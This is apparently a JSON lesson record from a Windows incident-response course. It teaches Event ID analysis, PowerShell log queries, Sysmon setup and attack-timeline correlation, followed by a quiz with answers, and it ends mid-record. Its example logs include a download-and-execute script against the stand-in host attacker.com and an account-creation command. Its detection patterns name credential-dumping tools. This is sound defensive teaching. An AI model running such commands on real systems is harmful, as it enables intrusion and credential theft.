{
  "lesson_id": "e5f6a7b8-c9d0-4e1f-2a3b-4c5d6e7f8a9b",
  "domain": "dfir",
  "title": "Windows Event Log Analysis for Incident Response",
  "difficulty": 2,
  "order_index": 3,
  "prerequisites": [
    "7333ad37-a513-4598-a23b-9729e3114bae"
  ],
  "concepts": [
    "Windows Event Logs",
    "Event IDs",
    "Security Log",
    "System Log",
    "Application Log",
    "Event Correlation",
    "PowerShell Logging",
    "Sysmon",
    "Log Analysis"
  ],
  "content_blocks": [
    {
      "block_id": "1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d",
      "type": "mindset_coach",
      "content": {
        "text": "Windows Event Logs are the black box of Windows systems - they record everything that happens. Every login, every failed authentication, every process creation, every service start, every error. Master Windows Event Logs and you can reconstruct attacks, identify compromised accounts, detect lateral movement, and build complete incident timelines.\n\nHere's what changes everything: Most organizations collect event logs but few actually analyze them effectively. They have terabytes of logs sitting in SIEM systems but don't know what to look for. The difference between a junior analyst and a senior incident responder often comes down to knowing which Event IDs matter and what they reveal about attacker behavior.\n\nMany people find event logs intimidating - millions of events, cryptic Event IDs, XML format. Here's the secret: You don't need to memorize all 10,000+ Event IDs. You need to know the critical 20-30 Event IDs that reveal authentication, privilege escalation, lateral movement, persistence, and execution. These are the breadcrumbs attackers leave behind.\n\nThink of event logs like security camera footage:\n- **Security log** = Main entrance camera (who logged in, authentication failures, privilege changes)\n- **System log** = Building systems camera (services starting, system crashes, driver loads)\n- **Application log** = Individual room cameras (application-specific events)\n- **Sysmon** = High-definition camera everywhere (process creation, network connections, file changes)\n\nThe beautiful part: Event logs don't lie. Attackers can delete files, clear command history, and remove tools - but event logs persist. Even if attackers clear logs, the log clearing itself generates an event (Event ID 1102). You always have forensic artifacts.\n\nThis lesson teaches you the critical Event IDs for incident response, how to correlate events across systems, how to detect common attacks (pass-the-hash, lateral movement, privilege escalation), and how to use PowerShell and Sysmon for deep visibility. Not theory - practical event log analysis for real-world incidents."
      },
      "simplified_explanation": "Windows Event Logs = Records of everything happening on Windows. Security log = logins/auth. System log = services/errors. Application log = app-specific events. Critical Event IDs reveal attacks: 4624 (login), 4625 (failed login), 4672 (special privileges), 4688 (process creation). Sysmon adds detailed telemetry.",
      "memory_aids": [
        "4624 = Successful logon (good), 4625 = Failed logon (potential brute force)",
        "4672 = Special privileges assigned (admin/SYSTEM access)",
        "4688 = Process created (what programs executed)",
        "4720 = User account created, 4732 = User added to admin group",
        "Event ID 1102 = Security log cleared (attacker covering tracks)"
      ],
      "teach_like_im_10": "Event logs are like a diary that Windows writes in constantly. Every time someone logs in, starts a program, or changes something important, Windows writes it down with a special code number (Event ID). Detective work means reading the diary to see who did what and when. Even if bad guys try to erase pages, the diary records that someone erased pages!"
    },
    {
      "block_id": "2b3c4d5e-6f7a-8b9c-0d1e-2f3a4b5c6d7e",
      "type": "explanation",
      "content": {
        "text": "## Windows Event Log Basics\n\n### Event Log Types\n\n**Security Log**:\n- **Location**: Event Viewer → Windows Logs → Security\n- **Records**: Authentication, authorization, object access, policy changes\n- **Size**: Often largest log (high-value targets)\n- **Retention**: Configure retention policy (default often too short)\n- **Requires**: Audit policies enabled\n\n**System Log**:\n- **Location**: Event Viewer → Windows Logs → System\n- **Records**: Service start/stop, driver loads, system errors, hardware events\n- **Use**: System stability, malware service detection\n\n**Application Log**:\n- **Location**: Event Viewer → Windows Logs → Application\n- **Records**: Application events, crashes, errors\n- **Use**: Application-specific forensics\n\n**PowerShell Log**:\n- **Location**: Event Viewer → Applications and Services Logs → Microsoft → Windows → PowerShell → Operational\n- **Records**: PowerShell commands, script blocks\n- **Critical**: Many attacks use PowerShell\n\n**Sysmon Log** (if installed):\n- **Location**: Event Viewer → Applications and Services Logs → Microsoft → Windows → Sysmon → Operational\n- **Records**: Process creation, network connections, file creation, registry changes, driver loads\n- **Value**: Extremely detailed telemetry (gold standard for IR)\n\n### Event Structure\n\n**Every event contains**:\n- **Event ID**: Unique identifier for event type (e.g., 4624 = successful logon)\n- **Timestamp**: When event occurred\n- **Source**: Component that generated event (e.g., Microsoft-Windows-Security-Auditing)\n- **Task Category**: Grouping (e.g., Logon/Logoff)\n- **Level**: Information, Warning, Error, Critical\n- **User**: User account associated with event\n- **Computer**: System where event occurred\n- **Event Data**: Specific details (username, IP address, process name, etc.)\n\n### Accessing Event Logs\n\n**GUI (Event Viewer)**:\n```\neventvwr.msc\nNavigate to log type → Filter or search\n```\n\n**PowerShell** (Recommended for IR):\n```powershell\n# Get recent Security events\nGet-EventLog -LogName Security -Newest 100\n\n# Get specific Event ID\nGet-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -MaxEvents 100\n\n# Search by date range\nGet-WinEvent -FilterHashtable @{\n    LogName='Security'\n    StartTime=(Get-Date).AddDays(-1)\n    EndTime=Get-Date\n}\n\n# Search for failed logins\nGet-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} |\n    Select-Object TimeCreated, Message |\n    Format-Table -AutoSize\n\n# Export to CSV for analysis\nGet-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} |\n    Select-Object TimeCreated, ID, Message |\n    Export-Csv -Path logins.csv -NoTypeInformation\n```\n\n**Command Line**:\n```cmd\n# List event logs\nwevtutil el\n\n# Query Security log\nwevtutil qe Security /c:100 /rd:true /f:text\n\n# Export log\nwevtutil epl Security C:\\backup\\security.evtx\n```\n\n## Critical Security Event IDs\n\n### Authentication Events\n\n**Event ID 4624 - Successful Logon**\n\n**What it tells you**: Someone successfully logged in.\n\n**Key Fields**:\n- **Logon Type**: How they logged in\n  - **Type 2**: Interactive (local keyboard/console)\n  - **Type 3**: Network (accessing shared folder, remote registry)\n  - **Type 4**: Batch (scheduled task)\n  - **Type 5**: Service (service account login)\n  - **Type 7**: Unlock (workstation unlocked)\n  - **Type 10**: RemoteInteractive (RDP)\n  - **Type 11**: CachedInteractive (cached credentials, no DC contact)\n- **Account Name**: Who logged in\n- **Source Network Address**: Where they came from (IP)\n- **Workstation Name**: Computer name\n- **Logon Process**: Authentication package used\n\n**Example**:\n```\nEvent ID: 4624\nLogon Type: 10 (RemoteInteractive)\nAccount Name: Administrator\nSource Network Address: 192.168.1.100\nWorkstation Name: WORKSTATION01\n\nInterpretation: Administrator logged in via RDP from 192.168.1.100\n```\n\n**Suspicious Patterns**:\n- Logon Type 3 with admin account from unusual IP (lateral movement?)\n- Logon Type 10 from external IP (unauthorized RDP access?)\n- Logins outside business hours\n- Service account interactive logins (Type 2 - should only be Type 5)\n\n**Event ID 4625 - Failed Logon**\n\n**What it tells you**: Login attempt failed.\n\n**Key Fields**:\n- **Account Name**: Who tried to log in\n- **Failure Reason**: Why it failed\n  - **0xC000006D**: Bad username or password\n  - **0xC000006E**: Account locked\n  - **0xC000006F**: Login outside allowed time\n  - **0xC0000070**: Workstation restriction\n  - **0xC0000072**: Account disabled\n  - **0xC0000234**: Account locked (too many failed attempts)\n- **Source Network Address**: Where attempt came from\n- **Logon Type**: How they tried to log in\n\n**Attack Detection**:\n```powershell\n# Find brute force attempts (multiple failed logins)\nGet-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} |\n    Group-Object {$_.Properties[5].Value} |\n    Where-Object {$_.Count -gt 10} |\n    Select-Object Count, Name\n# Shows accounts with >10 failed logins\n```\n\n**Event ID 4648 - Logon with Explicit Credentials**\n\n**What it tells you**: User logged in but provided different credentials (RunAs, net use).\n\n**Use Case**: Detect credential theft, privilege escalation attempts.\n\n**Example**:\n```\nEvent ID: 4648\nSubject Account: john.doe\nTarget Account: Administrator\nTarget Server: DC01\n\nInterpretation: john.doe used Administrator credentials to access DC01\nQuestion: Does john.doe legitimately have Administrator credentials?\n```\n\n**Event ID 4672 - Special Privileges Assigned to New Logon**\n\n**What it tells you**: User logged in with administrative/special privileges.\n\n**Key Privileges**:\n- **SeDebugPrivilege**: Debug programs (dangerous - dump passwords from lsass.exe)\n- **SeBackupPrivilege**: Backup files (bypass file permissions)\n- **SeLoadDriverPrivilege**: Load kernel drivers (rootkit potential)\n- **SeTakeOwnershipPrivilege**: Take ownership of any file\n\n**Correlation**: Occurs immediately after 4624 for admin logins.\n\n**Suspicious**: Unexpected accounts getting these privileges.\n\n### Account Management Events\n\n**Event ID 4720 - User Account Created**\n\n**What it tells you**: New user account created.\n\n**Key Fields**:\n- **Account Name**: New account name\n- **Who created it**: Subject Account Name\n\n**Suspicious**:\n- Accounts created outside change management windows\n- Accounts with suspicious names (admin$, support, temp)\n- Accounts created by non-admin users\n\n**Event ID 4732 - Member Added to Security-Enabled Local Group**\n\n**What it tells you**: User added to group (often Administrators).\n\n**Critical Groups**:\n- Administrators\n- Domain Admins\n- Enterprise Admins\n- Backup Operators\n\n**Example**:\n```\nEvent ID: 4732\nMember: DOMAIN\\attacker\nGroup: Administrators\nAdded by: DOMAIN\\compromised-admin\n\nRed flag: Privilege escalation or persistence\n```\n\n**Event ID 4728 - Member Added to Security-Enabled Global Group**\n\nSame as 4732 but for global groups (often domain-level groups).\n\n**Event ID 4740 - User Account Locked Out**\n\n**What it tells you**: Account locked due to too many failed login attempts.\n\n**Correlation**: Look for preceding 4625 events to find attack source.\n\n### Process Execution Events\n\n**Event ID 4688 - Process Created**\n\n**What it tells you**: Program executed.\n\n**Requirements**: Audit Process Creation policy enabled + Command Line logging enabled.\n\n**Key Fields**:\n- **New Process Name**: Full path of executable\n- **Creator Process Name**: Parent process\n- **Account Name**: User who ran it\n- **Command Line**: Full command with arguments (if enabled)\n\n**Example**:\n```\nEvent ID: 4688\nNew Process: C:\\Windows\\System32\\cmd.exe\nCreator Process: C:\\Windows\\explorer.exe\nAccount Name: john.doe\nCommand Line: cmd.exe /c whoami\n\nInterpretation: john.doe opened cmd.exe from Explorer\n```\n\n**Suspicious Patterns**:\n```powershell\n# Look for PowerShell with encoded commands (obfuscation)\nGet-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} |\n    Where-Object {$_.Message -match 'powershell.*-encodedcommand'}\n\n# Look for processes spawned from Office apps (macro malware)\nGet-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} |\n    Where-Object {$_.Message -match 'winword.exe|excel.exe' -and $_.Message -match 'cmd.exe|powershell.exe'}\n```\n\n**Event ID 4689 - Process Exited**\n\n**What it tells you**: Process terminated (correlate with 4688 for duration).\n\n### Service Events\n\n**Event ID 7045 - Service Installed** (System Log)\n\n**What it tells you**: New Windows service created.\n\n**Key Fields**:\n- **Service Name**\n- **Service File Path**\n- **Service Type**\n- **Service Start Type** (Auto, Manual, Disabled)\n- **Account Name**: What account service runs as\n\n**Attack Vector**: Malware installs itself as service for persistence.\n\n**Example**:\n```\nEvent ID: 7045\nService Name: WindowsUpdateService\nService File Path: C:\\Users\\Public\\malware.exe\nStart Type: Auto Start\nAccount: LocalSystem\n\nRed flags:\n- Generic name mimicking legit service\n- Executable in unusual location (Users\\Public)\n- Runs as LocalSystem (high privileges)\n```\n\n**Detection**:\n```powershell\n# Find services from unusual locations\nGet-WinEvent -FilterHashtable @{LogName='System'; ID=7045} |\n    Where-Object {$_.Message -match 'Temp|AppData|Users\\\\Public'}\n```\n\n**Event ID 7036 - Service Started/Stopped** (System Log)\n\n**What it tells you**: Service state changed.\n\n**Use**: Track service activity, detect malware service starts.\n\n### Log Clearing Events\n\n**Event ID 1102 - Security Log Cleared**\n\n**What it tells you**: Someone cleared the Security log (often attacker covering tracks).\n\n**Key Fields**:\n- **Account Name**: Who cleared it\n- **Timestamp**: When it was cleared\n\n**Critical**: This is extremely suspicious in production environments. Legitimate clearing should only happen during maintenance windows with change tickets.\n\n**Event ID 104 - System Log Cleared** (System Log)\n\nSame but for System log.\n\n## PowerShell Logging\n\n### PowerShell Event IDs\n\n**Event ID 4104 - Script Block Logging**\n\n**What it tells you**: PowerShell script content (the actual code executed).\n\n**Requirements**: Enable Script Block Logging via Group Policy.\n\n**Value**: See exact PowerShell commands, even if attacker uses encoded commands.\n\n**Example**:\n```\nEvent ID: 4104\nScript Block Text:\n  Invoke-WebRequest -Uri http://attacker.com/malware.exe -OutFile C:\\Temp\\malware.exe\n  Start-Process C:\\Temp\\malware.exe\n\nRed flag: Downloading and executing unknown executable\n```\n\n**Detection**:\n```powershell\n# Find PowerShell downloads\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} |\n    Where-Object {$_.Message -match 'Invoke-WebRequest|DownloadString|DownloadFile'}\n\n# Find credential dumping (Mimikatz-like)\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} |\n    Where-Object {$_.Message -match 'sekurlsa|lsadump|mimikatz'}\n```\n\n**Event ID 4103 - Module Logging**\n\n**What it tells you**: PowerShell cmdlets executed.\n\n**Enable**: Module Logging for suspicious modules.\n\n### Enabling PowerShell Logging\n\n**Group Policy**:\n```\nComputer Configuration → Administrative Templates → Windows Components → Windows PowerShell\n\nEnable:\n- Turn on Module Logging (select * for all modules)\n- Turn on PowerShell Script Block Logging\n- Turn on PowerShell Transcription (creates text log of session)\n```\n\n**Registry** (if no GPO):\n```powershell\n# Enable Script Block Logging\nNew-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\" -Name \"EnableScriptBlockLogging\" -Value 1 -PropertyType DWORD\n```\n\n## Sysmon (System Monitor)\n\n### What is Sysmon?\n\n**Sysmon** is a Windows system service (from Sysinternals) that logs detailed telemetry:\n- Process creation (with hashes, parent process, command line)\n- Network connections (source, destination, process)\n- File creation timestamps changed\n- Registry modifications\n- Driver loads\n- Process memory access\n- And 27+ other event types\n\n### Critical Sysmon Event IDs\n\n**Event ID 1 - Process Creation**\n\n**What it logs**:\n- Process name and path\n- Command line (full arguments)\n- Parent process (who spawned it)\n- User\n- Hashes (MD5, SHA256)\n- Timestamps\n\n**Value**: Much more detailed than Event ID 4688.\n\n**Example**:\n```\nEvent ID: 1\nImage: C:\\Windows\\System32\\cmd.exe\nCommandLine: cmd.exe /c \"powershell -enc <base64>\"\nParentImage: C:\\Program Files\\Microsoft Office\\WINWORD.EXE\nUser: DOMAIN\\victim\nHashes: MD5=..., SHA256=...\n\nRed flag: Word spawning cmd.exe spawning PowerShell with encoded command (macro malware)\n```\n\n**Event ID 3 - Network Connection**\n\n**What it logs**: Outbound network connections with process that made connection.\n\n**Example**:\n```\nEvent ID: 3\nImage: C:\\Windows\\System32\\cmd.exe\nDestinationIp: 192.0.2.50\nDestinationPort: 4444\nUser: DOMAIN\\victim\n\nRed flag: cmd.exe making outbound connection to port 4444 (common C2 port)\n```\n\n**Detection**:\n```powershell\n# Find connections to unusual ports\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=3} |\n    Where-Object {$_.Message -match 'DestinationPort: (4444|1337|8080|31337)'}\n\n# Find connections from unusual processes\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=3} |\n    Where-Object {$_.Message -match 'cmd.exe|powershell.exe|wscript.exe' -and $_.Message -match 'DestinationIp'}\n```\n\n**Event ID 10 - Process Access**\n\n**What it logs**: Process accessing another process's memory.\n\n**Use Case**: Detect credential dumping (accessing lsass.exe).\n\n**Example**:\n```\nEvent ID: 10\nSourceImage: C:\\Temp\\mimikatz.exe\nTargetImage: C:\\Windows\\System32\\lsass.exe\nGrantedAccess: 0x1010\n\nRed flag: Unknown process reading lsass.exe memory (credential dumping)\n```\n\n**Event ID 11 - File Created**\n\n**What it logs**: File created or overwritten.\n\n**Use Case**: Track malware dropped files, ransomware file encryption.\n\n**Event ID 13 - Registry Value Set**\n\n**What it logs**: Registry key/value modifications.\n\n**Use Case**: Detect persistence (Run keys), settings changes.\n\n**Example**:\n```\nEvent ID: 13\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware\nDetails: C:\\Users\\Public\\malware.exe\n\nRed flag: New Run key added for persistence\n```\n\n### Installing and Configuring Sysmon\n\n**Install**:\n```powershell\n# Download from Sysinternals\nwget https://download.sysinternals.com/files/Sysmon.zip -OutFile Sysmon.zip\nExpand-Archive Sysmon.zip\n\n# Install with config\n.\\Sysmon64.exe -accepteula -i sysmonconfig.xml\n```\n\n**Recommended Config** (SwiftOnSecurity config):\n```bash\nwget https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile sysmonconfig.xml\n```\n\n**Update config**:\n```powershell\n.\\Sysmon64.exe -c sysmonconfig.xml\n```\n\n## Event Correlation and Analysis\n\n### Lateral Movement Detection\n\n**Scenario**: Attacker moves from Workstation to Server.\n\n**Event Chain**:\n```\n[Workstation]\n1. Event 4648 - Explicit credentials used (Target: Server, Account: admin)\n2. Event 4624 - Logon Type 3 (Network logon to Server)\n\n[Server]\n3. Event 4624 - Logon Type 3 (From Workstation IP, Account: admin)\n4. Event 4672 - Special privileges assigned (admin logged in)\n5. Event 4688 or Sysmon 1 - Suspicious process created\n```\n\n**Query**:\n```powershell\n# Find network logons from unusual sources\nGet-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} |\n    Where-Object {\n        $_.Properties[8].Value -eq 3 -and  # Logon Type 3\n        $_.Properties[11].Value -notmatch '^(10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.)' # Not internal IP\n    }\n```\n\n### Pass-the-Hash Detection\n\n**Indicators**:\n- Event 4624 (Logon Type 3) with NTLM authentication\n- Event 4648 (Explicit credentials)\n- Multiple systems accessed in short time\n- Originating from non-admin workstation\n\n**Detection**:\n```powershell\n# Find NTLM logons (pass-the-hash often uses NTLM)\nGet-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} |\n    Where-Object {$_.Message -match 'NTLM' -and $_.Properties[8].Value -eq 3}\n```\n\n### Privilege Escalation Timeline\n\n**Event Sequence**:\n```\n1. Event 4624 - Initial low-privilege logon\n2. Event 4688 - Exploitation tool executed\n3. Event 4672 - Special privileges assigned (escalation successful)\n4. Event 4732 - User added to Administrators group\n5. Event 4624 - New admin logon\n```\n\n### Ransomware Detection\n\n**Indicators**:\n```\n[Sysmon]\n1. Event 1 - Suspicious process created (ransomware executable)\n2. Event 11 - Mass file creation (encrypted files)\n   - Look for: .encrypted, .locked, README.txt patterns\n   - High volume in short time\n3. Event 23 - File deletion (originals deleted after encryption)\n\n[Security]\n4. Event 4663 - Mass file access (encrypting files)\n```\n\n**Detection**:\n```powershell\n# Find mass file modifications (Sysmon Event 11)\n$events = Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=11; StartTime=(Get-Date).AddHours(-1)}\n$byProcess = $events | Group-Object {($_.Message -split '\\n' | Select-String 'Image:').ToString().Split(':')[1].Trim()}\n$byProcess | Where-Object {$_.Count -gt 1000} | Format-Table Count, Name\n# Shows processes that created >1000 files in 1 hour (ransomware?)\n```\n\n## Practical Incident Response Queries\n\n### Find All Logins by Specific User\n\n```powershell\n$username = \"compromised.user\"\nGet-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} |\n    Where-Object {$_.Properties[5].Value -eq $username} |\n    Select-Object TimeCreated,\n        @{Name='User';Expression={$_.Properties[5].Value}},\n        @{Name='LogonType';Expression={$_.Properties[8].Value}},\n        @{Name='SourceIP';Expression={$_.Properties[18].Value}} |\n    Format-Table -AutoSize\n```\n\n### Find Failed Login Attempts (Brute Force)\n\n```powershell\n# Group failed logins by source IP\nGet-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} |\n    Group-Object {$_.Properties[19].Value} |\n    Where-Object {$_.Count -gt 10} |\n    Sort-Object Count -Descending |\n    Select-Object Count, @{Name='SourceIP';Expression={$_.Name}} |\n    Format-Table -AutoSize\n```\n\n### Find Processes Created by Specific Parent\n\n```powershell\n# Find all processes spawned by Word (macro analysis)\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} |\n    Where-Object {$_.Message -match 'ParentImage.*winword.exe'} |\n    ForEach-Object {\n        [PSCustomObject]@{\n            Time = $_.TimeCreated\n            Process = ($_.Message -split '\\n' | Select-String 'Image:').ToString().Split(':')[1].Trim()\n            CommandLine = ($_.Message -split '\\n' | Select-String 'CommandLine:').ToString().Split(':',2)[1].Trim()\n        }\n    } |\n    Format-Table -AutoSize\n```\n\n### Timeline of Account Activity\n\n```powershell\n$account = \"admin\"\n$events = @(\n    Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624,4625,4672,4720,4732} |\n        Where-Object {$_.Message -match $account}\n)\n\n$events | Sort-Object TimeCreated | ForEach-Object {\n    [PSCustomObject]@{\n        Time = $_.TimeCreated\n        EventID = $_.Id\n        Message = ($_.Message -split '\\n')[0]\n    }\n} | Format-Table -AutoSize\n```\n\n## Key Takeaways\n\n1. **Event ID 4624/4625** = Successful/Failed logins (authentication)\n2. **Event ID 4672** = Special privileges (admin access)\n3. **Event ID 4688** = Process created (execution)\n4. **Event ID 4720/4732** = Account created / added to group (privilege escalation)\n5. **Event ID 7045** = Service installed (persistence)\n6. **Event ID 1102** = Security log cleared (anti-forensics)\n7. **Sysmon Event 1** = Detailed process creation (with hashes, command line, parent)\n8. **Sysmon Event 3** = Network connections (C2 detection)\n9. **Sysmon Event 10** = Process access (credential dumping)\n10. **PowerShell Event 4104** = Script block logging (see actual commands)\n\nEvent logs are your primary forensic artifact on Windows. Master the critical Event IDs and you can reconstruct any attack."
      },
      "ascii_art": "WINDOWS EVENT LOG ARCHITECTURE\n\n┌─────────────────────────────────────┐\n│        EVENT VIEWER                 │\n├─────────────────────────────────────┤\n│ Windows Logs:                       │\n│  ├─ Security (4624, 4625, 4672...)  │\n│  ├─ System (7045, 7036...)          │\n│  ├─ Application                     │\n│                                     │\n│ Applications and Services Logs:     │\n│  ├─ PowerShell/Operational (4104)   │\n│  ├─ Sysmon/Operational (1,3,10...)  │\n│  └─ Others...                       │\n└─────────────────────────────────────┘\n         │\n         ↓\n┌─────────────────────────────────────┐\n│    PHYSICAL LOG FILES               │\n│                                     │\n│ C:\\Windows\\System32\\winevt\\Logs\\   │\n│  ├─ Security.evtx                   │\n│  ├─ System.evtx                     │\n│  ├─ Application.evtx                │\n│  └─ [Others].evtx                   │\n└─────────────────────────────────────┘\n\nLOGIN EVENT FLOW\n\nUser logs in\n     ↓\n┌─────────────────┐\n│ Event 4624      │  Successful Logon\n│ Logon Type: 10  │  (RemoteInteractive = RDP)\n│ User: admin     │\n│ Source: 1.2.3.4 │\n└─────────────────┘\n     ↓\n┌─────────────────┐\n│ Event 4672      │  Special Privileges Assigned\n│ User: admin     │  (Admin logged in)\n│ Privileges:     │\n│ - SeDebugPriv   │\n│ - SeBackupPriv  │\n└─────────────────┘\n\nATTACK DETECTION TIMELINE\n\nInitial Access:\n  Event 4624 (Logon Type 10) from external IP\n       ↓\nCredential Dumping:\n  Sysmon Event 10 (ProcessAccess → lsass.exe)\n       ↓\nLateral Movement:\n  Event 4648 (Explicit Credentials)\n  Event 4624 (Logon Type 3 to DC)\n       ↓\nPrivilege Escalation:\n  Event 4732 (Added to Domain Admins)\n  Event 4672 (Special privileges)\n       ↓\nPersistence:\n  Event 7045 (Service Installed)\n  Sysmon Event 13 (Run key added)\n       ↓\nAnti-Forensics:\n  Event 1102 (Security log cleared)\n\nSYSMON VALUE COMPARISON\n\nWithout Sysmon:\n  Event 4688: Process Created\n  - Process name: cmd.exe\n  - User: admin\n  [Limited detail]\n\nWith Sysmon:\n  Event 1: Process Created\n  - Image: C:\\Windows\\System32\\cmd.exe\n  - CommandLine: cmd /c \"net user admin pass /add\"\n  - ParentImage: C:\\Windows\\explorer.exe\n  - User: DOMAIN\\admin\n  - Hashes: MD5=abc123, SHA256=def456\n  - CurrentDirectory: C:\\Users\\admin\n  - IntegrityLevel: High\n  [Complete visibility!]",
      "examples": [
        {
          "scenario": "Detecting Credential Stuffing Attack via Event Logs",
          "explanation": "SOC analyst reviewing Security log finds 500+ Event ID 4625 (failed logon) events in 10 minutes, all from IP 203.0.113.50. Account names vary (john.doe, admin, jane.smith, etc.) but all failed with reason 0xC000006D (bad username/password). Pattern indicates credential stuffing (attacker trying leaked credentials from other breaches). Analyst blocks source IP at firewall, enables account lockout policy (lock after 5 failed attempts), reviews if any attempts succeeded (looks for Event 4624 from same IP - none found). Implements rate limiting on authentication endpoint. Attack blocked before successful compromise. Event logs provided early warning and attack details (source IP, timing, targeted accounts)."
        },
        {
          "scenario": "Reconstructing Ransomware Attack Timeline via Sysmon",
          "explanation": "Incident responder investigating ransomware finds: (1) Sysmon Event 1 shows 'invoice.exe' created at 14:23 by Outlook (suspicious email attachment). (2) Sysmon Event 3 shows 'invoice.exe' connected to 198.51.100.50:443 (C2 server). (3) Sysmon Event 11 shows mass file creation (.encrypted extension) starting 14:25 - 50,000 files in 15 minutes from 'invoice.exe'. (4) Event 7045 shows service 'WinDefender' (mimicking legitimate name) installed pointing to C:\\ProgramData\\update.exe (persistence). (5) Event 1102 shows Security log cleared at 14:40 (anti-forensics). Timeline: Email opened → Malware executed → C2 contact → Encryption → Persistence → Log clearing. Sysmon provided complete attack reconstruction including hashes of malware (for IOC sharing), C2 IP (for blocking), and exact timing (for backup restore point selection)."
        },
        {
          "scenario": "Identifying Pass-the-Hash Lateral Movement",
          "explanation": "Threat hunter analyzing domain controller logs finds unusual pattern: Event 4624 (Logon Type 3, NTLM authentication) from 'john.doe' account accessing 15 different servers in 5 minutes - all from same workstation (192.168.1.50). Correlation with Event 4648 shows explicit credentials used for each connection. Suspicious because: (1) john.doe is regular user (not admin), (2) Accessing servers john.doe normally doesn't access, (3) NTLM auth instead of Kerberos (pass-the-hash uses NTLM), (4) Rapid sequential access (automated tool). Investigation of workstation 192.168.1.50 reveals Mimikatz in memory and john.doe account compromised. Attacker dumped credentials from workstation, performed pass-the-hash to move laterally. Event correlation across multiple systems revealed attack pattern invisible on single system."
        }
      ]
    },
    {
      "type": "video",
      "content": {
        "title": "Video: Windows Event Log Analysis for Incident Response Overview",
        "url": "https://www.youtube.com/embed/zN5-pOsGILA",
        "description": "Watch this video for a visual introduction to the concepts covered in this lesson."
      }
    },
    {
      "block_id": "3c4d5e6f-7a8b-9c0d-1e2f-3a4b5c6d7e8f",
      "type": "quiz",
      "content": {
        "text": "Test your Windows Event Log knowledge",
        "questions": [
          {
            "question": "What does Event ID 4624 with Logon Type 10 indicate?",
            "options": [
              "Local interactive login at keyboard",
              "Network login to shared folder",
              "Remote Desktop (RDP) login",
              "Service account login"
            ],
            "correct_answer": 2,
            "explanation": "Event ID 4624 = Successful logon. Logon Type determines HOW they logged in: Type 2 = Interactive (local console), Type 3 = Network (file share, remote registry), Type 5 = Service, Type 10 = RemoteInteractive (RDP/Terminal Services). Type 10 specifically means someone logged in via Remote Desktop. Important for incident response - can track RDP access and identify unauthorized remote access."
          },
          {
            "question": "An attacker clears the Security event log to cover their tracks. Which Event ID records this action?",
            "options": [
              "Event ID 4688",
              "Event ID 1102",
              "Event ID 4624",
              "Event ID 7045"
            ],
            "correct_answer": 1,
            "explanation": "Event ID 1102 = Audit log was cleared. This event is generated WHEN the Security log is cleared, recording who cleared it and when. Ironically, attackers clearing logs to hide their tracks create a highly suspicious event (log clearing in production is rare and suspicious). 4688 = process created, 4624 = logon, 7045 = service installed. Always investigate Event 1102 - legitimate log clearing should only occur during scheduled maintenance with change tickets."
          },
          {
            "question": "Which Sysmon Event ID would detect a process accessing lsass.exe memory (credential dumping)?",
            "options": [
              "Event ID 1 (Process Creation)",
              "Event ID 3 (Network Connection)",
              "Event ID 10 (Process Access)",
              "Event ID 13 (Registry Value Set)"
            ],
            "correct_answer": 2,
            "explanation": "Sysmon Event ID 10 (ProcessAccess) logs when one process accesses another process's memory. Credential dumping tools (Mimikatz, etc.) read lsass.exe memory to extract passwords/hashes. Event 10 shows: SourceImage (attacker tool), TargetImage (lsass.exe), GrantedAccess permissions. Event 1 = process creation (useful but doesn't show memory access), Event 3 = network connections, Event 13 = registry changes. Event 10 is gold standard for detecting credential theft attempts."
          },
          {
            "question": "What indicates a likely brute force attack in Event Logs?",
            "options": [
              "Single Event 4624 (successful logon)",
              "Multiple Event 4625 (failed logon) from same source IP in short time",
              "Event 4672 (special privileges assigned)",
              "Event 4688 (process created)"
            ],
            "correct_answer": 1,
            "explanation": "Brute force attack = automated password guessing with many attempts. Shows as multiple Event ID 4625 (failed logon attempts) from same source IP over short time period. Query: Group Event 4625 by source IP, look for counts >10-50 in minutes/hours. Single 4624 = normal login. Event 4672 = admin privileges (follows successful admin login). Event 4688 = process execution (not auth related). Always correlate multiple failed logins - could be attack or legitimate user forgetting password."
          },
          {
            "question": "Why is Sysmon valuable compared to default Windows event logging?",
            "options": [
              "Sysmon replaces Windows Event Logs completely",
              "Sysmon provides much more detail including process hashes, command lines, parent processes, and network connections",
              "Sysmon is faster than Windows Event Logs",
              "Sysmon automatically blocks attacks"
            ],
            "correct_answer": 1,
            "explanation": "Sysmon ENHANCES default logging with detailed telemetry: Event 1 includes full command line, parent process, file hashes (MD5/SHA256), integrity level. Event 3 logs network connections with process that made them. Event 10 detects process memory access. Event 11 tracks file creation. This detail enables detection of sophisticated attacks missed by default logging. Sysmon doesn't replace Windows logs (they coexist), doesn't block attacks (it's monitoring only), speed is not the advantage. Deploy Sysmon on all endpoints for comprehensive visibility."
          }
        ]
      }
    },
    {
      "block_id": "4d5e6f7a-8b9c-0d1e-2f3a-4b5c6d7e8f9a",
      "type": "reflection",
      "content": {
